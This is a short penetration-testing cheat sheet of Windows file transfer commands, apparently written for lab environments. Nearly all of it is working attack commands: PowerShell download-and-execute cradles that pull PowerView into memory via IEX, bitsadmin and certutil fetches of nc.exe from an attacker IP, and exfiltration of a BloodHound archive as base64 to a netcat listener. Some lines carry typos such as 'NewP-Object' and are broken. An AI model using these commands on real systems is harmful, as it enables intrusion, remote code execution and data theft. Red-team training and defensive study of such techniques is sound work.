# Windows File Transfer Methods

## PowerShell 

### Download

```PowerShell
# Download over HTTP

(New-Object System.Net.WebClient).DownloadFile('https://<snip>/PowerView.ps1',"C:\<snip>\PowerView.ps1")

# From PowerShell 3.0 Invoke-WebRequest is available with aliases iwr, curl and wget

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1

# Executation Cradle to load into memory

IEX (NewP-Object Net.WebClient).downloadstring('https://<snip>/PowerView.ps1')

# Executation Crade via Pipeline input

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 | iex

# If Using IWR and you get IE First-Launch Configuration this can be bypassed using `-UseBasicParsing`

iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
iwr https://<snip>PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing | iex
```

Additional PowerShell download cradles can be found at [PowerShell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Upload

It is also possible to upload files using PowerShell with either `Invoke-WebRequest` or `Invoke-RestMethod`

```PowerShell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

After catching the content with NetCat, or other preferred transfer method, you can decode it on your Kali machine using:

```Bash
echo <base64> | base64 -d -w 0 > bloodhound.zip
```

## BitsAdmin

### Download

```PowerShell
# Bitsadmin Executable

bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

# BitsAdmin PowerShell Module

Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Upload

```PowerShell
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql

```

## CertUtil

This tool is in every version of Windows and is a popular technique; however, the AntiMalware Scan Interface (AMSI) can detect this as malicious certutil usage

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
